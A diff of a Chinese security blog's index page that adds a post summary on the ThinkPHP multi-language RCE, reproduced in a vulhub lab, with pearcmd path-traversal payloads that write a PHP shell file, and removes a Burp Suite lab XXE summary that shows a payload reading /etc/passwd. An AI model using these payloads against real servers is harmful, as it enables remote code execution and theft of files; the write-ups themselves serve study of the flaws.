@@ -110,6 +110,32 @@
         alt="https://www.gravatar.com/avatar/aa99b351245441b8ca95d54a52d2998c?s=240&amp;d=mp"
         title="https://www.gravatar.com/avatar/aa99b351245441b8ca95d54a52d2998c?s=240&amp;d=mp" /></a></div><h1 class="home-title">ThnPinkman's blog</h1><div class="home-subtitle"><div id="id-1" class="typeit"></div></div><div class="links"></div></div>
 <article class="single summary" itemscope itemtype="http://schema.org/Article"><h1 class="single-title" itemprop="name headline">
+        <a href="/posts/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/thinkphp-%E5%A4%9A%E8%AF%AD%E8%A8%80-rce/">Thinkphp 多语言 RCE</a>
+    </h1><div class="post-meta"><span class="post-author"><a href="/" title="Author" rel=" author" class="author"><i class="fas fa-user-circle fa-fw" aria-hidden="true"></i>Author</a>
+</span>&nbsp;<span class="post-publish">published on <time datetime="2024-08-20">2024-08-20</time></span>&nbsp;<span class="post-category">included in <a href="/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"><i class="far fa-folder fa-fw" aria-hidden="true"></i>代码审计</a></span></div><div class="content">Thinkphp 多语言 RCE 漏洞介绍 Thinkphp，v6.0.1~v6.0.13，v5.0.x，v5.1.x
+如果 Thinkphp 程序开启了多语言功能，那就可以通过 get、header、cookie 等位置传入参数，实现目录穿越+文件包含，通过 pearcmd 文件包含这个 trick 即可实现 RCE。
+文件包含漏洞存在的情况下还需要服务器满足下面两个条件才能利用：
+PHP环境开启了register_argc_argv PHP环境安装了pcel/pear Docker默认的PHP环境恰好满足上述条件。所以先使用vulhub进行漏洞利用的复现
+vulhub漏洞搭建 cd vulhub/thinkphp/lang-rce编译环境docker-compose build运行环境docker-compose up -d 访问 ip:8080
+漏洞利用 测试包含public/index.php文件来确认文件包含漏洞是否存在
+?lang=../../../../../public/index 如果漏洞存在，则服务器会出错，返回500页面
+利用一：写入文件 利用pearcmd写入shell文件
+?+config-create+/&amp;lang=../../../../../../../../../../../usr/local/lib/php/pearcmd&amp;/&lt;?=phpinfo()?&gt;+shell.php 如果服务器返回pearcmd的命令行执行结果，说明漏洞利用成功
+此时访问url/shell.php即可发现已经成功写入文件
+利用二：文件包含 使用pearcmd在/tmp文件夹下创建文件再进行包含，P神文章?lang=../../../../../../../usr/local/lib/php/pearcmd&amp;+config-create+/&amp;/&lt;?=phpinfo()?&gt;+/tmp/shell.php ?lang=../../../../../../../tmp/shell 2023 realword ctf体验赛 中出现了这个利用方法
+漏洞分析 TP6在路径app/middleware.php 开启多语言特性
+测试漏洞成功
+thinkphp程序初始化都会运行src/think/App.php里的initialize()方法
+函数中使用this-&gt;loadLangPack()获取语言包，跟进loadLangPack()方法
+却发现只有加载默认语言包的功能，换一条路
+访问
+?lang=../../../../../public/index src/think/middleware/LoadLangPack.php 查看LoadLangPack.php
+在 middleware 的 handle() 函数会被调用，这里断在 LoadLangPack.php 的 handle()
+跟进detect()方法
+可以看到依次排查了 GET[&quot;lang&quot;] 、HEADER[&quot;think-lang&quot;] 、COOKIE[&quot;think_lang&quot;] ，并且将其不做任何过滤，直接赋值给了 $langSet</div><div class="post-footer">
+        <a href="/posts/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/thinkphp-%E5%A4%9A%E8%AF%AD%E8%A8%80-rce/">Read More</a><div class="post-tags">
+                <i class="fas fa-tags fa-fw" aria-hidden="true"></i>&nbsp;<a href="/tags/php/">Php</a></div></div>
+</article><article class="single summary" itemscope itemtype="http://schema.org/Article"><h1 class="single-title" itemprop="name headline">
         <a href="/posts/web%E6%BC%8F%E6%B4%9E%E5%9F%BA%E7%A1%80/go%E8%AF%AD%E8%A8%80%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/">go语言模板注入</a>
     </h1><div class="post-meta"><span class="post-author"><a href="/" title="Author" rel=" author" class="author"><i class="fas fa-user-circle fa-fw" aria-hidden="true"></i>Author</a>
 </span>&nbsp;<span class="post-publish">published on <time datetime="2024-08-20">2024-08-20</time></span>&nbsp;<span class="post-category">included in <a href="/categories/web%E6%BC%8F%E6%B4%9E%E5%9F%BA%E7%A1%80/"><i class="far fa-folder fa-fw" aria-hidden="true"></i>Web漏洞基础</a></span></div><div class="content">前言 go语言越来越活跃在ctf的web赛题中，之前也经常有遇到使用go的命令执行文件上传后进行执行命令（大概是我第一次遇到go）
@@ -190,21 +216,6 @@ http://localhost:80%2523@stock.weliketoshop.net/admin/delete?username=carlos SSR
 题目中直接告诉我们Referer头存在SSRF盲打漏洞</div><div class="post-footer">
         <a href="/posts/web%E6%BC%8F%E6%B4%9E%E5%9F%BA%E7%A1%80/burpsuite%E9%9D%B6%E5%9C%BAssrf/">Read More</a><div class="post-tags">
                 <i class="fas fa-tags fa-fw" aria-hidden="true"></i>&nbsp;<a href="/tags/ssrf/">Ssrf</a></div></div>
-</article><article class="single summary" itemscope itemtype="http://schema.org/Article"><h1 class="single-title" itemprop="name headline">
-        <a href="/posts/web%E6%BC%8F%E6%B4%9E%E5%9F%BA%E7%A1%80/burpsuite%E9%9D%B6%E5%9C%BAxxe/">burpsuite靶场XXE</a>
-    </h1><div class="post-meta"><span class="post-author"><a href="/" title="Author" rel=" author" class="author"><i class="fas fa-user-circle fa-fw" aria-hidden="true"></i>Author</a>
-</span>&nbsp;<span class="post-publish">published on <time datetime="2024-08-20">2024-08-20</time></span>&nbsp;<span class="post-category">included in <a href="/categories/web%E6%BC%8F%E6%B4%9E%E5%9F%BA%E7%A1%80/"><i class="far fa-folder fa-fw" aria-hidden="true"></i>Web漏洞基础</a></span></div><div class="content">参考以下文章学习
-https://xz.aliyun.com/t/3357什么是XML？ XML全称是可扩展标记语言，是用来存储和传输数据的一种数据格式，结构上和HTML类似，但是XML使用的是自定义的标签名，XML在Web早期中比较流行，现在开始流行JSON格式的数据了。
-什么是XML实体？ XML实体是一种表示数据项的方式，比如用实体&lt; and &gt;表示符号&lt;和&gt;，XML用实体来表示XML标签。
-什么是文档类型定义(DTD)？ DTD全称是document type definition，其可以定义XML文档的结构、它可以包含的数据类型和其他项目。DTD在XML文档开头以可选DOCTYPE节点中声明。DTD可以在文档内部(内部DTD)或从其他地方(外部DTD)加载，也可以混合加载。
-什么是XML自定义实体？ XML允许在DTD中自定义实体，例如 &lt;!DOCTYPE foo [ &lt;!ENTITY myentity &quot;my entity value&quot; &gt; ]&gt; 如例所示，首先声明了一个名为foo的DTD，然后在DTD中声明了一个自定义实体，名为myentity，该自定义实体中的数据为”my entity value”，可以使用&amp;myentity引用该自定义实体中的数据。
-什么是XML外部实体？ XML外部实体也是一种自定义实体，它声明的在DTD之外，外部实体的声明使用SYSTEM关键字，然后指定加载实体值的URL，例如 &lt;!DOCTYPE foo [ &lt;!ENTITY ext SYSTEM &quot;http://normal-website.com&quot; &gt; ]&gt; URL也可以是使用file伪协议从而加载指定的文件内容，例如 &lt;!DOCTYPE foo [ &lt;!ENTITY ext SYSTEM &quot;file:///path/to/file&quot; &gt; ]&gt; XXE漏洞就是利用这种特性获取敏感文件内容或者发动如命令执行、SSRF等攻击。
-使用外部实体利用 XXE 来检索文件 访问产品页面，单击“检查库存”，抓包
-然后就是构造外部实体来查看文件
-&lt;!DOCTYPE foo [ &lt;!ENTITY xxe SYSTEM &#34;file:///etc/passwd&#34; &gt; ]&gt;&lt;stockCheck&gt;&lt;productId&gt;&amp;xxe;&lt;/productId&gt;&lt;storeId&gt;1&lt;/storeId&gt;&lt;/stockCheck&gt; 将productId数字替换为对外部实体的引用：&amp;xxe;
-利用 XXE 执行 SSRF 攻击 与上题payload类似</div><div class="post-footer">
-        <a href="/posts/web%E6%BC%8F%E6%B4%9E%E5%9F%BA%E7%A1%80/burpsuite%E9%9D%B6%E5%9C%BAxxe/">Read More</a><div class="post-tags">
-                <i class="fas fa-tags fa-fw" aria-hidden="true"></i>&nbsp;<a href="/tags/xxe/">Xxe</a></div></div>
 </article><ul class="pagination"><li class="page-item ">
                     <span class="page-link">
                         <a href="/">1</a>
@@ -231,10 +242,14 @@ https://xz.aliyun.com/t/3357什么是XML？ XML全称是可扩展标记语言�
                     <span class="page-link">
                         <a href="/page/11/">11</a>
                     </span>
+                </li><li class="page-item ">
+                    <span class="page-link">
+                        <a href="/page/12/">12</a>
+                    </span>
                 </li></ul></div></div>
             </main><footer class="footer">
         <div class="footer-container"><div class="footer-line">Powered by <a href="https://gohugo.io/" target="_blank" rel="noopener noreffer" title="Hugo 0.133.0">Hugo</a> | Theme - <a href="https://github.com/Fastbyte01/KeepIt" target="_blank" rel="noopener noreffer" title="KeepIt 0.2.10"><i class="far fa-kiss-wink-heart fa-fw" aria-hidden="true"></i> KeepIt</a>
-                </div><div class="footer-line" itemscope itemtype="http://schema.org/CreativeWork"><i class="far fa-copyright fa-fw" aria-hidden="true"></i><span itemprop="copyrightYear">2022 - 2024</span><span class="author" itemprop="copyrightHolder">&nbsp;<a href="/" target="_blank"></a></span></div>
+                </div><div class="footer-line" itemscope itemtype="http://schema.org/CreativeWork"><i class="far fa-copyright fa-fw" aria-hidden="true"></i><span itemprop="copyrightYear">2022 - 2025</span><span class="author" itemprop="copyrightHolder">&nbsp;<a href="/" target="_blank"></a></span></div>
         </div>
     </footer></div>
 
